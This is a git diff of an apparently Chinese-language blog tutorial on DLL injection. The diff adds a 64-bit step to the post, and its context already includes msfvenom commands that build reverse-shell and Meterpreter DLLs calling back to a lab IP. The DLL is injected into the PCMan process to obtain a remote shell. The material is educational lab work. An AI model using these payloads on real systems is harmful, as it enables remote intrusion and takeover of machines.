@@ -17,7 +17,7 @@
 <meta property="og:image" content="https://tenghaooo.github.io/pics/PCMan.JPG">
 <meta property="og:image" content="https://tenghaooo.github.io/pics/rshell.JPG">
 <meta property="article:published_time" content="2022-05-10T12:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-12T01:59:36.610Z">
+<meta property="article:modified_time" content="2022-05-20T05:58:45.531Z">
 <meta property="article:author" content="tenghaooo">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://tenghaooo.github.io/pics/kernel32.JPG">
@@ -122,9 +122,11 @@
 <p>用msfvenom製作dll，放到D:\test\下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.32.128 LPORT=4444 -f dll &gt; rshell.dll</span><br></pre></td></tr></table></figure>
 
-<p>如果要注入的remote process是32bit的，那就製作32bit的dll，injector也編譯成x86<br>如果要注入的remote process是64bit，那就用64bit的dll，injector也編譯成x64</p>
+<p>如果要注入的remote process是32bit的，那就製作32bit的dll，injector也編譯成x86。<br>如果要注入的remote process是64bit，那就用64bit的dll，injector也編譯成x64，用msfvenom製作64bit的dll。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.32.128 LPORT=4444 -f dll &gt; rshell64.dll</span><br></pre></td></tr></table></figure>
+
 <p>可以看到32bit process的kernel32的address和其路徑<code>C:\Windows\SysWOW64\kernel32.dll</code><br><img src="https://tenghaooo.github.io/pics/kernel32.JPG" alt="32-bit kernel32"></p>
-<p>如果injector編譯成x86，也會是這個address和路徑<br>但如果是x64，會變成<code>C:\Windows\System32\kernel32.dll</code></p>
+<p>如果injector編譯成x86，其kernl32也會是這個address和路徑<br>但如果是x64，會變成<code>C:\Windows\System32\kernel32.dll</code></p>
 <p>注入成功後，可以看到PCMan有載入rshell.dll，而且有spawn出cmd<br><img src="https://tenghaooo.github.io/pics/PCMan.JPG" alt="注入PCMan"></p>
 <p>並且成功獲取shell<br><img src="https://tenghaooo.github.io/pics/rshell.JPG" alt="rshell"></p>
 <p>參考資料<br><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection</a><br><a target="_blank" rel="noopener" href="https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks">https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks</a><br><a target="_blank" rel="noopener" href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a></p>
@@ -132,7 +134,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://tenghaooo.github.io/2022/05/10/RE-dll-injection/" data-id="cl32d55jo0007qwtva7lndlsp" data-title="dll injection" class="article-share-link">Share</a>
+      <a data-url="https://tenghaooo.github.io/2022/05/10/RE-dll-injection/" data-id="cl3e1azo7000jt0tvbrt7h57n" data-title="dll injection" class="article-share-link">Share</a>
       
       
       
